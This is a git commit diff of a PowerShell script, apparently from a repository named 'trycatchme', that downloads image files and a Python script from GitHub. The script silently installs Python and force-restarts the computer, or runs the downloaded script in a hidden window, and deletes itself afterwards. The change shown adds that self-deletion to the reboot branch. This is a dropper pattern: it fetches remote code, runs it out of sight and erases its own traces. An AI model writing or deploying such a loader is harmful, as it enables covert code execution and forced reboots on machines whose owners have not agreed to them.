e8fcddd1ab9883273e40351037ecf8dfada680c9
M4rc333l <94375791+M4rc333l@users.noreply.github.com>
2024-06-25 19:45:46 +0200

    Update trycatchme2.ps1

--- trycatchme2.ps1
+++ trycatchme2.ps1
@@ -7,5 +7,5 @@ Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick2
 Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebob.png" -OutFile "Spongebob.png"
 Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
 $p = &{python -V} 2>&1
-$version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe";Start-Process "Python-Install.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; Restart-Computer} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
+$version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe";Start-Process "Python-Install.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe";Remove-Item "t.ps1";Restart-Computer} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
 Remove-Item "t.ps1"
